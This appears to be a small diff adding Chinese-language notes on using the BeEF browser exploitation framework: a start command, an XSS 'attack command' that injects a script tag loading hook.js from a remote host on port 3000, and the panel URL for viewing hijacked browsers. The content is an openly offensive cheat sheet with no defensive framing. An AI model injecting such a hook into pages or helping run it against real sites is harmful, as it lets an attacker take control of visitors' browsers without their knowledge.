@@ -1,0 +1,3 @@
+beef启动：beef-xss-start 
+beef攻击命令：     <script src="http://(肉鸡ip):3000/hook.js"> </script>
+beef查看劫持目标主机界面：http://127.0.0.1:3000/ui/panel
